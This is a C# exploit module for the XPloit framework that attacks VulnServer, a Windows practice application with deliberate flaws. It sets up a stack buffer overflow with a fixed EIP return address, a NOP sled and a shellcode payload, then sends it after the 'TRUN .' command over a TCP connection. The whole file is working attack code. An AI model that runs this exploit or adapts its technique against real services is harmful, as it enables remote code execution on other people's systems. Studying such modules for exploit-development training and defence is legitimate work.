using Nops.AsmX86;
using System;
using System.Net.Sockets;
using System.Text;
using XPloit.Core;
using XPloit.Core.Enums;
using XPloit.Core.Extensions;
using XPloit.Core.Helpers;
using XPloit.Core.Interfaces;
using XPloit.Core.Requirements.Payloads;

namespace Exploits.Multi
{
    public class VulnServer : TcpModule
    {
        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "VulnServer exploit"; } }
        public override IPayloadRequirements PayloadRequirements { get { return new BufferOverflowPayloadRequirement(); } }
        public override Target[] Targets
        {
            get
            {
                return new Target[]
                {
                    new Target(EPlatform.Windows, EArquitecture.x86,"Windows 10",
                        new Variable("Config", new BufferOverflowPayloadRequirement.BufferOverflowConfig()
                            {
                                EIP = new byte[] { 0xaf , 0x11 , 0x50 , 0x62 },
                                BadChars=new byte[] { 0x00},
                                HeaderLength=2006,
                                NopCount=5,
                                Space=1000
                            })
                    )
                };
            }
        }
        #endregion

        public override bool Run()
        {
            TcpClient tcp = null;

            try
            {
                Encoding ascii = Encoding.ASCII;

                // Generate payload
                WriteInfo("Generating payload");
                // Header
                byte[] header = ascii.GetBytes("TRUN .");

                // Buffer overflow
                BufferOverflowPayloadRequirement bof = (BufferOverflowPayloadRequirement)PayloadRequirements;
                bof.Config = (BufferOverflowPayloadRequirement.BufferOverflowConfig)Target["Config"];

                switch (Target.Arquitecture)
                {
                    case EArquitecture.x86: bof.NopGenerator = new AsmX86Nop(); break;
                }

                byte[] send = header.Concat(bof.Prepare(Target, (BufferOverflowPayloadRequirement.IBufferOverflowPayload)Payload));
                WriteInfo("Payload generated successful", StringHelper.Convert2KbWithBytes(send.Length), ConsoleColor.Green);

                // Send payload
                WriteInfo("Connecting ...");
                tcp = Connect();

                WriteInfo("Connected successful");
                tcp.Client.Send(send);
                WriteInfo("Payload send");
            }
            catch (Exception e)
            {
                WriteError(e.Message);
                return false;
            }
            finally
            {
                Close(tcp);
            }

            return true;
        }
    }
}